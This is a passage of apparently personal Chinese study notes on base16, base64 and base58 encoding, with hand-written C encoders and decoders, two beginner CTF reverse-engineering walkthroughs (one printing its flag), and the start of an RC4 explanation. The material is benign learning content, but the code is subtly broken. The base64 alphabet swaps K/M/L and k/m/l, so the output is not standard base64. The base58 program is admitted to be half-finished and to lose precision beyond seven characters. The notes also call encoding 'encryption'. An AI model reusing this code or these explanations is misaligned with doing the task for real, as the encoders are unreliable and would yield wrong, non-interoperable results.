class="line"></span><br></pre></td></tr></table></figure></div>

<p>也可以自定义字典实现私人的加密解密，但base16只支持16个字符，且加密会将数据量增大一倍</p>
<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>base64原理类似但是其为6bit为一个字符，只有3字符才能完整分为4个字符，所以通过补0来实现解密前与解密后的一一对应</p>
<p>具体如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> zidian[]=&#123;<span class="string">&quot;ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijkmlnopqrstuvwxyz0123456789+/&quot;</span>&#125;;<span class="comment">//字典</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">base64</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">int</span> n,<span class="type">char</span> *jiemi)</span><span class="comment">//加密操作</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a;<span class="comment">//vsc中char有符号</span></span><br><span class="line"><span class="type">int</span> b,c;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//每三个字符生成四个字符的密文，此处判断是否满足能被三整除以判断是否需要补位</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;<span class="comment">//取char型的高6位</span></span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];<span class="comment">//取前一个char的低2位和后一个的高4位</span></span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];<span class="comment">//取前一个char的低4位和后一个的高二位</span></span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>];<span class="comment">//取最后一个的低6位 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">3</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>]; </span><br><span class="line">&#125;<span class="comment">//因为余一，所以取最后的字符的高六位，作为一个字符，剩下的二位与四个0组成下个字符，剩下的两个密文字符全由0补齐</span></span><br><span class="line">a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">jiemi[c]=zidian[a];</span><br><span class="line">a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">jiemi[c+<span class="number">1</span>]=zidian[a&gt;&gt;<span class="number">2</span>];</span><br><span class="line">jiemi[c+<span class="number">2</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">jiemi[c+<span class="number">3</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>]; </span><br><span class="line">&#125;<span class="comment">//因为余二，所以取最后的字符的高六位，作为一个字符，剩下的二位与下个字符的高四位组成下个字符，剩下的两位与四位0补齐，最后的剩下的一个密文字符全由0补齐</span></span><br><span class="line">a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">jiemi[c]=zidian[a];</span><br><span class="line">a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">jiemi[c+<span class="number">2</span>]=zidian[a&gt;&gt;<span class="number">2</span>];</span><br><span class="line">jiemi[c+<span class="number">3</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">a=((n-n%<span class="number">3</span>)/<span class="number">3</span>)+<span class="number">1</span>;</span><br><span class="line">jiemi[<span class="number">4</span>*a]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">found</span><span class="params">(<span class="type">char</span> jiami)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;<span class="comment">//char具有符号会出现复数等离奇情况 unsigned char无符号则无此情况</span></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>;a&lt;<span class="number">64</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(jiami==zidian[a])<span class="comment">//与字典对应寻找密文对应的6位二进制数</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base64jiemi</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">int</span> n,<span class="type">char</span> *jiemi)</span><span class="comment">//解密操作</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c;<span class="comment">//char具有符号会出现复数等离奇情况 unsigned char无符号则无此情况</span></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>;a&lt;n;a+=<span class="number">4</span>,b+=<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        jiemi[b]=(found(jiami[a])&lt;&lt;<span class="number">2</span>)+(found(jiami[a+<span class="number">1</span>])&gt;&gt;<span class="number">4</span>);<span class="comment">//8bit数需要6位和2位拼接此处都为拼接操作</span></span><br><span class="line">        c=found(jiami[a+<span class="number">1</span>])&lt;&lt;<span class="number">4</span>;</span><br><span class="line">        jiemi[b+<span class="number">1</span>]=c+(found(jiami[a+<span class="number">2</span>])&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        c=found(jiami[a+<span class="number">2</span>])&lt;&lt;<span class="number">6</span>;</span><br><span class="line">        jiemi[b+<span class="number">2</span>]=c+found(jiami[a+<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n,m,flag;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择加密/解密 0/1&quot;</span>);<span class="comment">//加密解密二合一</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入加密长度&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">getchar();<span class="comment">//吸掉回车</span></span><br><span class="line"><span class="type">char</span> *jiami=(<span class="type">char</span>*)<span class="built_in">calloc</span>(n,<span class="keyword">sizeof</span>(<span class="type">char</span>));<span class="comment">//申请连续的内存作为数组使用</span></span><br><span class="line">fgets(jiami,n,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;n;m++)</span><br><span class="line"><span class="keyword">if</span>(jiami[m]==<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    jiami[m]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *jiemi=(<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="number">4</span>*(((n-n%<span class="number">3</span>)/<span class="number">3</span>)+<span class="number">1</span>)<span class="number">-1</span>,<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">base64(jiami,m,jiemi);</span><br><span class="line"><span class="built_in">puts</span>(jiemi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入解密长度&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">getchar();<span class="comment">//吸掉回车</span></span><br><span class="line"><span class="type">char</span> *jiami=(<span class="type">char</span>*)<span class="built_in">calloc</span>(n,<span class="keyword">sizeof</span>(<span class="type">char</span>));<span class="comment">//申请连续的内存作为数组使用</span></span><br><span class="line">fgets(jiami,n,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;n;m++)</span><br><span class="line"><span class="keyword">if</span>(jiami[m]==<span class="string">&#x27;\n&#x27;</span>)<span class="comment">//fgets会吸掉回车，可以以回车来作为结束符</span></span><br><span class="line">&#123;</span><br><span class="line">    jiami[m]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *jiemi=(<span class="type">char</span>*)<span class="built_in">calloc</span>(m,<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">base64jiemi(jiami,m,jiemi);</span><br><span class="line"><span class="built_in">puts</span>(jiemi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="题目（reverse3）-buuctf"><a href="#题目（reverse3）-buuctf" class="headerlink" title="题目（reverse3）-buuctf"></a>题目（reverse3）-buuctf</h5><p>先用shift+f12搜索flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203131098.png"
                      alt="image-20221124203131098"
                ></p>
<p>搜索到base64加密字典，猜测是用base64加密完成的</p>
<p>再在左侧通过搜索名称</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203000964.png"
                      alt="image-20221124203000964"
                ></p>
<p>可以定位到main函数，通过观察输入前的函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203222336.png"
                      alt="image-20221124203222336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203340270.png"
                      alt="image-20221124203340270"
                ></p>
<p>由位运算规律可知sub_4110BE是进行base64加密的，再观察下侧for循环可知进行了移位操作，所以加密逻辑是输入-base64-移位等于最后的str2</p>
<p>对str2进行相反的操作便可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203529195.png"
                      alt="image-20221124203529195"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221124203602999.png"
                      alt="image-20221124203602999"
                ></p>
<p>由此得到了最后的flag</p>
<h5 id="RE1-PYC"><a href="#RE1-PYC" class="headerlink" title="RE1.PYC"></a>RE1.PYC</h5><p>先启动该文件看下运行结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221203235231628.png"
                      alt="image-20221203235231628"
                ></p>
<p>不知道是因为什么无法再次运行，通过搜索找到是因为没有原py文件所以无法再次运行，那就通过ida(32位)看看其源代码</p>
<p>pyc文件主要是无法通过f5反汇编查找代码逻辑</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221203235426178.png"
                      alt="image-20221203235426178"
                ></p>
<p>尝试通过shift+f12查询字符串，结果如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221203234728213.png"
                      alt="image-20221203234728213"
                ></p>
<p>一般有效的字符串，线索之类的会出现在此，如果不有效也一般会放在内存附近（一般）</p>
<p>通过双击寻找，往上翻后最终找到了对应的密文（非flag{}此类格式应该是经过了加密）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221203235623344.png"
                      alt="image-20221203235623344"
                ></p>
<p>下方也有说明，表现是通过base64加密的，将其拖入base64中解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221203235745853.png"
                      alt="image-20221203235745853"
                ></p>
<p>得到了最后的flag：D0g3{Do_You_Want_To_Hammer_Me},这flag真欠揍(bushi)</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h4 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h4><p>顾名思义，其字典长度为58个字符，但58无法用位运算得出，效率较低，需通过将字符串按顺序排列，左边的为高位，右边为低位，将其ascii码以十进制一一排列（同样从高到低）用其十进制数连续对58取余再将余数逆序输出就是对应的58进制数（与58字符的字典对应）但此时数字是十分大的，进行大数字运算可能失去精度，可将其转化为文本顺序读取（待做）</p>
<p>加密解密网站：<a class="link"   href="http://www.atoolbox.net/Tool.php?Id=932" >Base58编码&#x2F;解码 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>字典为”123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”</p>
<p>半成品（如果超过输入7个字符，数据过大，损失精度，无法正常输出）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> zidian[] = <span class="string">&quot;123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> e=<span class="number">98</span>;</span><br><span class="line"><span class="comment">//下面为加密所用函数</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">cifang</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n)</span><span class="comment">//计算a的n次方方便进行每次都取到两位来与字典一一对应</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)a * cifang(a, n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua10</span><span class="params">(<span class="type">char</span>* a, <span class="type">int</span> n)</span><span class="comment">//转化为十进制数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>) * a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)((*(a + n - <span class="number">1</span>)) + (zhuanhua10(a, n - <span class="number">1</span>) * <span class="number">256</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua58</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n, <span class="type">int</span>* p, <span class="type">int</span>* flag)</span><span class="comment">//转化为58进制数同时每两位表示一个58进制方便对字典进行比较</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (*flag == <span class="number">0</span>)<span class="comment">//*p用来计算所存在的字符串长度方便从高位到低位输出，同时方便创造存放加密后密文的数组</span></span><br><span class="line">	&#123;</span><br><span class="line">		*p = *p + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n % <span class="number">58</span> == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*flag == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*p = *p - <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> n % <span class="number">58</span> + zhuanhua58((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(n - n % <span class="number">58</span>) / <span class="number">58</span>, p, flag) * <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base58</span><span class="params">(<span class="type">char</span>* jiami, <span class="type">int</span> n, <span class="type">int</span>* p, <span class="type">char</span>* jiemi, <span class="type">int</span>* flag)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a, b;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> c;</span><br><span class="line">	c = zhuanhua58(zhuanhua10(jiami, n), p, flag);</span><br><span class="line">	<span class="keyword">for</span> (a = *p, b = <span class="number">0</span>; a &gt; <span class="number">0</span>; a--, b++)</span><br><span class="line">	&#123;</span><br><span class="line">		jiemi[b] = zidian[(c / cifang(<span class="number">100</span>, a)) - (c / cifang(<span class="number">100</span>, a + <span class="number">1</span>)) * <span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	jiemi[b + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面为解密所用函数</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">jiaoyan</span><span class="params">(<span class="type">char</span> a)</span><span class="comment">//与字典进行比较找到对应的58进制值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b;</span><br><span class="line">	<span class="keyword">for</span>(b=<span class="number">0</span>;<span class="number">1</span>;b++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a==zidian[b])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">huifu10</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span><span class="comment">//将58进制值转化为10进制值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> jiaoyan(jiami[n])+huifu10(jiami,n<span class="number">-1</span>)*<span class="number">58</span>;<span class="comment">//从n开始是因为输入的数组第0位为高位，后位为低位，从最低位开始方便进行进制转化,且因为58进制数每位都要占两位所以乘了100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">huifu256</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n%<span class="number">256</span>+huifu256((n-n%<span class="number">256</span>)/<span class="number">256</span>)*<span class="number">1000</span>;<span class="comment">//将10进制数转化为256进制（与ascii码对应）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base58jiemi</span><span class="params">(<span class="type">char</span> *jiemi,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">1000</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	e++;<span class="comment">//因为要输入所以前移一位但此时以经没有输入了就让数组指向最高位字符</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">jiemi[e]=n%<span class="number">1000</span>;<span class="comment">//取低三位获取低位值</span></span><br><span class="line">e--;<span class="comment">//将数组前移一位</span></span><br><span class="line">base58jiemi(jiemi,n/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请选择加密/解密：0/1&quot;</span>);</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">switch</span>(n)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入字符数&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="type">char</span>* jiami = (<span class="type">char</span>*)<span class="built_in">calloc</span>(n+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	fgets(jiami, n+<span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="type">int</span> jishu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> fla = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>* flag = &amp;fla;</span><br><span class="line">	<span class="type">int</span>* pjishu = &amp;jishu;</span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">0</span>; <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (jiami[n] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			jiami[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	zhuanhua58(zhuanhua10(jiami, n), pjishu, flag);</span><br><span class="line">	*flag = <span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span>* jiemi = (<span class="type">char</span>*)<span class="built_in">calloc</span>(*pjishu + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	base58(jiami, n, pjishu, jiemi, flag);</span><br><span class="line">	<span class="built_in">puts</span>(jiemi);</span><br><span class="line">	&#125;;<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入字符数&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="type">char</span>* jiami = (<span class="type">char</span>*)<span class="built_in">calloc</span>(n+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	fgets(jiami, n+<span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">0</span>; <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (jiami[n] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			jiami[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> jiemi[<span class="number">100</span>]=<span class="string">&quot;\0&quot;</span>;</span><br><span class="line">	jiemi[<span class="number">99</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	base58jiemi(jiemi,huifu256(huifu10(jiami,n<span class="number">-1</span>)));</span><br><span class="line">	<span class="built_in">puts</span>(jiemi+e);</span><br><span class="line">	&#125;;<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>初始的S表是线性的（如y&#x3D;x一样是一条直线，第一个元素为1第二个元素为二依次下去）初始密钥填充T表跟S表长度相同一般都为256(此处改为128是因为char在vs，vsc中为signed char 可见字符范围为128)（充当打乱工具，可由初始密钥再生，本质上是初始密钥重复填充如初始密钥123，则T表就为123123……如此循环）再通过打乱的S表生成真正的密钥（用来异或加密）&#x2F;&#x2F;但同样可能生成不可见字符，打印时会自动隐去,也无法正常输入</p>
<p>解密原理：</p>
<p>若KEY相同则打乱的顺序相同，生成的流密码也相同，通过再次对其进行异或就可以解密了</p>
